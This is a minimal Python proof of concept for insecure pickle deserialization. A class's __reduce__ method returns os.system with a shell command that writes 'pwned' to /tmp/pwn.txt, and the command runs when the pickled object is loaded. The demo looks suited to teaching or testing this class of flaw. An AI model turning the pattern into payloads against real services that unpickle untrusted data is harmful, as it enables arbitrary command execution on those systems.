import pickle
import os

class TestClass(object):
    def __reduce__(self):
        return (os.system, ('echo "pwned" > /tmp/pwn.txt',))

data = pickle.dumps(TestClass())

print(pickle.loads(data))
